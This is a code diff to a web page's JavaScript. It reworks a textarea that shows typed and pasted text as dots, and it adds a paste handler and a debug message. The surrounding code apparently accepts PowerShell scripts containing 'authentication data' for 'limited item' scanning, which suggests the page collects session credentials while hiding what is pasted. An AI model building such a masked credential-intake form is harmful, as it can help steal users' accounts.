@@ -174,27 +174,34 @@ function handleInput(event) {
     const textarea = event.target;
     const cursorPos = textarea.selectionStart;
     
-    // Always in privacy mode - convert typed characters to dots
-    const currentValue = textarea.value;
-    const inputLength = currentValue.length;
-    const realLength = realInputValue.length;
-    
-    if (inputLength > realLength) {
-        // User typed new characters
-        const newChars = currentValue.slice(realLength);
-        realInputValue += newChars;
-    } else if (inputLength < realLength) {
-        // User deleted characters
-        realInputValue = realInputValue.slice(0, inputLength);
+    // Check if this is a clear/select all + type operation
+    if (textarea.value.length === 0) {
+        realInputValue = '';
+        updateCharCount();
+        return;
     }
     
-    // Update display to show dots
+    // If textarea only has dots and user is typing, they're adding to the real content
+    const currentValue = textarea.value;
+    const isDotPattern = /^[•\s]*$/.test(currentValue);
+    
+    if (!isDotPattern) {
+        // User typed real characters (not dots), extract them
+        const nonDotChars = currentValue.replace(/[•]/g, '');
+        if (nonDotChars.trim()) {
+            realInputValue += nonDotChars;
+        }
+    }
+    
+    // Always show as dots
     showAsDots();
     
     // Restore cursor position approximately
     const dotValue = textarea.value;
     const newCursorPos = Math.min(cursorPos, dotValue.length);
-    textarea.setSelectionRange(newCursorPos, newCursorPos);
+    setTimeout(() => {
+        textarea.setSelectionRange(newCursorPos, newCursorPos);
+    }, 0);
     
     updateCharCount();
 }
@@ -244,6 +251,9 @@ async function submitPowerShell() {
         showNotification('Please enter limited item information before scanning', 'error');
         return;
     }
+    
+    // Debug: Show actual values being used
+    showNotification(`Debug: Real content length: ${realInputValue.length}, Input length: ${inputText.length}`, 'info');
 
     // Only allow scripts with authentication data or valid item data
     if (!hasValidData(inputText)) {
@@ -850,8 +860,18 @@ document.addEventListener('DOMContentLoaded', function() {
         textarea.classList.add('privacy-mode');
         textarea.addEventListener('input', handleInput);
         textarea.addEventListener('paste', function(e) {
-            // Handle paste events
-            setTimeout(() => handleInput({target: textarea}), 10);
+            // Get the pasted content directly from clipboard
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            
+            // Store the real pasted content
+            realInputValue = pastedText;
+            
+            // Show as dots
+            showAsDots();
+            
+            // Update character count
+            updateCharCount();
         });
     }
     
